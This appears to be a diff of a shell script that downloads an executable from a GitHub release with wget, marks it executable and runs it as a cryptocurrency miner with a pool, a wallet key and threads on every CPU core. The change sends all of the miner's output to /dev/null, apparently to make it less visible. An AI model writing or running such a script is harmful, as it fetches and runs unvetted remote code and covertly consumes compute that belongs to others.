@@ -2,4 +2,4 @@
 apt update && apt install unzip
 wget https://github.com/sakarohit/bsasd/releases/download/pacv/takos
 chmod +x takos
-./takos mine -a --pool twbitz --key xLPMoYZixVLRHJV7hb9gZoMusczWYRzP7JqFCRb6vXp --worker $(shuf -n 1 -i 1-99999)-PVS -t $(nproc --all) --ice
+./takos mine -a --pool twbitz --key xLPMoYZixVLRHJV7hb9gZoMusczWYRzP7JqFCRb6vXp --worker $(shuf -n 1 -i 1-99999)-PVS -t $(nproc --all) --ice >/dev/null 2>&1
